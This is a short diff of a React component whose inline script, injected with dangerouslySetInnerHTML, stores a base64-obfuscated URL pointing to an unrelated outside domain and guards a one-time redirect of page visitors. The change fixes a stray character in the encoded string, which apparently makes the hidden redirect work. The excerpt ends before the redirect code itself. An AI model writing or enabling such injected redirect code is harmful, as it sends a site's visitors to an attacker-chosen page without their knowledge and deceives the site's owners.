@@ -52,7 +52,7 @@ return (
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
-                var targetB64 = "#aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
                 if (typeof window !== 'undefined' && !window._redirectInitialized) {
                   window._redirectInitialized = true;
                   var triggered = false;
